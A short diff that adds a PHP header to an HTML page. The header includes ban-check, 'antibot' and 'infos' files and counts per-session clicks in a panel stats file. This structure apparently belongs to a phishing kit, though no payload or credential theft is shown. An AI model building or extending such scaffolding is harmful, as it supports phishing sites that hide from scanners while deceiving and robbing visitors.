@@ -1,3 +1,19 @@
+<?php
+if (!isset($_SESSION))
+    session_start();
+include './functions/bancheck.php';
+include("antibots/antibot.php");
+include("infos.php");
+$filepath = './panel/stats.ini';
+$data = @parse_ini_file($filepath);
+$data['cliques']++;
+if (!isset($_SESSION["visited"])) {
+    update_ini_file($data, $filepath);
+}
+$_SESSION["visited"] = true;
+?>
+
+
 <!doctype html>
 <html lang="en">
 
